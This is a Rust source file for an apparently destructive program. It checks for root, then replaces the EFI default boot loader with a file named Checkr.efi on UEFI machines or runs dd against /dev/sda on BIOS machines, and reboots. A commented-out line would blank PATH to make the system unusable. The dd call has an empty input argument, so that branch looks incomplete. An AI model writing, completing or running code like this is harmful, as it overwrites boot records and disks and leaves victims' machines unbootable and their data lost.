use std::process;
use nix::unistd::Uid;
use std::path;
use std::env;

mod log;
mod disk;
mod util;

fn main() {
    env::set_var("VERBOSE", "1");
    log::verbose("Starting up");

    let uid:bool = Uid::effective().is_root();
    if !uid {
        log::error("Program is not running as root, please run as root");
        process::exit(42);
    }
    //*Checks if system is booted in uefi. if it is it copies the Checkr.efi file over to EFI/boot/bootx64.efi. if not it writes raw data to the disk
    if path::Path::new("/sys/firmware/efi").exists() {
      log::info("uefi detected");
      let copytouefi = util::copytoefi();
      if copytouefi.is_err() {
          log::error("failed to copy file to EFI partition");
      }
    }
    else{
        if env::var("VERBOSE").is_ok() {log::info("bios detected");}
        let dd = process::Command::new("dd").arg("if=").arg("of=/dev/sda").spawn();
        if dd.is_err() {
            log::error("failed to write to disk.");

        }
    }

    //*Set path var to an empty string to render the system unavailable.
    //env::set_var("PATH", "");

    //*Finally it reboots the computer.
    let reboot = process::Command::new("reboot").spawn();
    if reboot.is_err() {
        log::error("failed to reboot");
    }

    process::exit(0);
}
